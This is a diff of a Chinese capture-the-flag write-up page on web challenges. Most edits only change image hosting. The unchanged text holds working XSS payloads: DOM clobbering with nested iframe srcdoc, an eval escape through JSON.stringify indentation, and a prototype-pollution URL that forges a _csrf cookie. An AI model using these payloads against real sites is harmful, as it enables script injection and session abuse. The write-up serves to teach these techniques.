@@ -98,7 +98,7 @@
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">outputBox</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;pre&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;`</span>
 </span></span></code></pre></div><p>因为我们的最终目的是<code>XSS</code>，所以我们需要进入<code>eval</code>函数，也就是需要给<code>this.config.debug</code>赋值，而且下面<code>outputBox.innerHTML</code>的赋值中的<code>output</code>可控，<code>JSON.stringify</code>的第三个参数可控的话可以导致逃逸出字符串</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301201858635.png" alt="image-20230120185847518"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201858635.png" alt="image-20230120185847518"></p>
 <p>我们可以将<code>&lt;pre&gt;</code>标签闭合，然后就可以插入任意<code>html</code>，比赛的时候没想到<code>DOM clobbering</code>，赛后学习一下</p>
 <p><a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
 <p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
@@ -127,16 +127,16 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
 </span></span></code></pre></div><p>运行后得到</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301201909812.png" alt="image-20230120190904772"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201909812.png" alt="image-20230120190904772"></p>
 <p>看下<code>textarea</code>，尝试发现其<code>cols</code>设置为字符串时，获得的<code>cols</code>值是默认的20</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301201910753.png" alt="image-20230120191004704"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054777.png" alt="image-20230120191004704"></p>
 <p>尝试发现<code>&lt;frameset&gt;</code>可用</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301201913999.png" alt="image-20230120191311950"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054756.png" alt="image-20230120191311950"></p>
 <p>即构造</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;frameset id=opts cols=aaa&gt;&#39; name=config&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span></code></pre></div><p>然后就是debug赋值，如果使用的标签和<code>&lt;frameset&gt;</code>同在body里面，那么只会出现其中一个</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301202006633.png" alt="image-20230120200600580"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202006633.png" alt="image-20230120200600580"></p>
 <p>所以使用<code>&lt;head&gt;</code>中的标签，这里用<code>title</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;iframe name=config srcdoc=&#39;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&#39;&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span></code></pre></div><p>在iframe中引入mian.js，</p>
@@ -146,11 +146,11 @@
 </span></span></code></pre></div><p>合起来</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;x&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
 </span></span></code></pre></div><p>此时我们可控的<code>output</code>为</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301202023919.png" alt="image-20230120202348875"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202023919.png" alt="image-20230120202348875"></p>
 <p>此时的cols可想到用<code>a:eval(xx)//</code>来执行命令，因为在js中，我们传入的<code>output</code>始终会用<code>{}</code>，所以执行赋值的时候需要配上键值对</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
 </span></span></code></pre></div><p>但是</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301202027220.png" alt="image-20230120202700177"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202027220.png" alt="image-20230120202700177"></p>
 <p>JSON.stringify()接收的第三个参数限制10个字母长，好在json字符串也是我们可控的，可以使用注释<code>/**/</code>来拼接，也就是</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">a:eval(/*</span><span style="color:#f92672">&#34;x&#34;</span>:<span style="color:#e6db74">&#34;*/alert(111))//&#34;</span>
@@ -258,7 +258,7 @@
 <p>根据<code>payload</code>发现<code>XSS</code>，在后端查看文件的路由中</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Any</span>(<span style="color:#e6db74">&#34;/file/:uuid/:filename&#34;</span>, <span style="color:#a6e22e">viewFileHandler</span>, <span style="color:#a6e22e">isLoggedIn</span>)
 </span></span></code></pre></div><p>这里接收两个参数，但是<code>viewFileHandler</code>只用到了<code>uuid</code>，所以<code>filename</code>可以随便设置，在<code>viewFileHandler</code>函数中</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232040325.png" alt="image-20230123204023104"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232040325.png" alt="image-20230123204023104"></p>
 <p>根据<code>UUID</code>在数据库中获得上传时传入的<code>FilesUpload</code>结构体数据</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FilesUpload</span> <span style="color:#66d9ef">struct</span> {
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">UUID</span>        <span style="color:#66d9ef">string</span>
@@ -268,7 +268,7 @@
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Username</span>    <span style="color:#66d9ef">string</span>
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>然后将其设置在响应头中。这里作者在注册时在<code>Username</code>中使用了空字节来截断响应头，达到XSS的目的</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232133026.png" alt="image-20230123213302840"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232133026.png" alt="image-20230123213302840"></p>
 <p>既然XSS的点找到了，但是访问文件路由时需要<code>session</code>，也就需要我们先登录获取<code>set-cookie</code>到bot的环境下，但是访问<code>/login</code>接口需要<code>_csrf</code>令牌符合，根据配置</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Use</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFWithConfig</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFConfig</span>{
 </span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">TokenLookup</span>:    <span style="color:#e6db74">&#34;form:_csrf,header:X-CSRF-TOKEN&#34;</span>,
@@ -278,9 +278,9 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">root_domain</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.magic.world&#34;</span>
 </span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">URL_1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/?__proto%5f_.srcdoc[]=&lt;script\u003edocument.cookie=&#39;_csrf=nyxmare; Path=/login; Domain=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">root_domain</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;\u003c/script\u003e`</span>)
 </span></span></code></pre></div><p>在前端<code>frontend.magic.world</code>中</p>
-<pre tabindex="0"><code>let {q} = parseParams(location.href);
-$(&#34;iframe&#34;).attr({ src: BASE_URL + q,...})
-</code></pre><p>解析当前<code>url</code>后使用<code>jquery</code>的<code>attr()</code>方法给选择的<code>iframe</code>属性赋值，在<code>parseParams</code>函数中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> {<span style="color:#a6e22e">q</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">attr</span>({ <span style="color:#a6e22e">src</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">BASE_URL</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">q</span>,...})
+</span></span></code></pre></div><p>解析当前<code>url</code>后使用<code>jquery</code>的<code>attr()</code>方法给选择的<code>iframe</code>属性赋值，在<code>parseParams</code>函数中</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">re</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/([^&amp;=]+)=?([^&amp;]*)/g</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {},
@@ -316,9 +316,9 @@ $(&#34;iframe&#34;).attr({ src: BASE_URL + q,...})
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>])) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>][parseInt(<span style="color:#a6e22e">index</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
 </span></span></code></pre></div><p>因为在<code>.attr()</code>中，in关键字无法对字符串使用</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232320914.png" alt="image-20230123232001852"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232320914.png" alt="image-20230123232001852"></p>
 <p>完成污染后，会对<code>&lt;iframe&gt;</code>设置<code>srcdoc</code>属性，且优先级高于<code>src</code></p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232245262.png" alt="image-20230123224540071"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232245262.png" alt="image-20230123224540071"></p>
 <p>执行我们传入的js，为之前的登录请求添加<code>Cookie</code>属性绕过<code>_csrf</code>的限制</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_csrf=nyxmare; Path=/login; Domain=.magic.world&#39;</span>
 </span></span></code></pre></div><p><code>bot</code>的<code>cookie</code>域只在后端域名，所以我们需要在后端中找到一个点，可以跳转到我们准备好的执行上面一系列的html中。在<code>index.js</code>中</p>
